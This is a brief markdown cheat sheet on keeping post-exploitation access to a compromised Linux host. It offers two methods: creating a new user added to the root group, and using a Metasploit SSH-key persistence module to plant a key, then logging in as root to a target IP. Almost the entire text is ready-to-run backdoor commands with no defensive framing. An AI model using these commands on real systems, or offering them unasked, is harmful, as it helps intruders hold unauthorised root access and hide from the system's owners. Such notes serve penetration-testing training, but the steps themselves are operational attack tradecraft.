# Establishing Persistence on a Linux Target
#### METHOD 1 : CREATING A NEW USER
By creating a new user and adding them to the ROOT group. We can later login as this user with ROOT privileges.

```
useradd -m "NEW USER" -s /bin/bash 
passwd "NEW USER"

#Add new user to ROOT group
usermod -aG root "NEW USER"
```

#### METHOD 2 : ADDING SSH KEY 
This module will add an Public SSH key to a specified user (or all), and gets us a private SSH key to allow remote login via SSH at any time.

```
use post/linux/manage/sshkey_persistence
set SESSION 6
set CREATESSHFOLDER true
exploit
```

Now we can copy the contents from the `loot` and create a new key file and give appropriate permissions. 

```
vim ssh_key
chmod 0400 ssh_key
ssh -i ssh_key root@192.50.177.3
```
